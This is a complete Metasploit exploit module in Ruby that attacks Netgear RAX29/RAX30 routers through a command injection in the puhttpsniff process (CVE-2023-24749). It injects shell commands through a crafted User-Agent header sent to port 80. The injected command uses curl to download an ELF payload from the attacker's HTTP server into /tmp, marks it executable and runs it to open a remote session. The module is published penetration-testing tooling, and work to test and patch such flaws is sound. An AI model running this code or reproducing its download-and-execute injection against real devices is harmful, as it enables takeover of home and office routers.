##
## This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Netgear RAX29/RAX30 (NightHawk) puhttpsniff Command Injection',
        'Description' => %q{
          Affects firmware prior to 1.0.9.92. This module is for LAN-side connections, e.g. while connected to wireless. For discussion of WAN-side exploitation, see the 'PwnAgent' writeup by mahaloz in the references.

          Netgear RAX29 and RAX30 devices are wireless Small Office / Home Office (SoHo) and "Gaming" routers. There is a process called puhttpsniff. This process inspects packets sent over tcp/80. puhttpsniff uses tainted data (User-Agent) to build a system() call leading to command injection.
        },
        'Author' => [
          'catatonicprime', # module
          'mahaloz'         # vuln research
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://mahaloz.re/2023/02/25/pwnagent-netgear.html'],
          [ 'URL', 'https://kb.netgear.com/000065451/Security-Advisory-for-Multiple-Vulnerabilities-on-the-RAX30-PSV-2022-0028-PSV-2022-0073'],
          [ 'URL', 'https://www.synacktiv.com/en/publications/cool-vulns-dont-live-long-netgear-and-pwn2own.html'],
          [ 'CVE', '2023-24749']
        ],
        'DisclosureDate' => '2022-12-13',
        'Platform' => 'linux',
        'Arch' => [ ARCH_ARMLE ],
        'Privileged' => true,
        'Targets' => [ [ 'Automatic Target', {}] ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ ]
        },
        'DefaultOptions' => {
          'RPORT' => '80',                 # puhttpsniff only listens on port 80
          'RHOSTS' => '192.168.1.1',       # default router IP
          'HTTPDELAY' => '5',              # 5 seconds seems to be sufficient
          'MeterpreterTryToFork' => 'true' # forking is possible and this allows additional sessions
        }
      )
    )

    register_options(
      [
        OptInt.new('HTTPDELAY', [true, 'Timeout in seconds for the HTTP Server to serve the payload.'])
      ], self.class
    )

    @is_check = false
    @is_vulnerable = false
  end

  def cmd_inject(cmd)
    vprint_status("Injecting command: '#{cmd}'")
    connect
    sock.put("User-Agent: \";#{cmd};#")
    disconnect
  end

  def get_title
    connect
    # We use a regular socket instead of HttpClient to avoid sending a User-Agent.
    sock.put("GET / HTTP/1.1\r\nHost: #{rhost}\r\n\r\n")
    sock.get_once # response headers
    html = Nokogiri::HTML(sock.get_once) # parse response body
    disconnect
    return html.title
  end

  def check
    # Check if vulnerable
    @is_check = true
    @is_vulnerable = false
    start_service
    begin
      Timeout.timeout(datastore['HTTPDELAY']) do
        primer
        sleep(1) while @is_check
      end
    rescue Timeout::Error
    end

    if @is_vulnerable
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    # Generate ELF payload for file dropper
    @exe = generate_payload_exe
    begin
      Timeout.timeout(datastore['HTTPDELAY']) { super }
    rescue Timeout::Error
    end
  end

  def on_request_uri(cli, request)
    if @is_check
      vprint_status("Received check: #{request.uri}")
      @is_vulnerable = true
      @is_check = false
      send_response(cli, '')
      return
    end
    vprint_status("Sending payload for requested uri: #{request.uri}")
    send_response(cli, @exe)
  end

  def primer
    @payload_uri = get_uri

    # Configure command for check or exploit
    if @is_check
      cmd = "curl -k #{@payload_uri}"
    else
      elf_file = '/tmp/' + rand_text_alpha_lower(8)
      cmd = "curl -k #{@payload_uri} -o #{elf_file}; chmod 500 #{elf_file}; #{elf_file}"
      # Cleanup
      register_files_for_cleanup(elf_file)
    end

    # Trigger Command injection
    cmd_inject(cmd)
  end
end
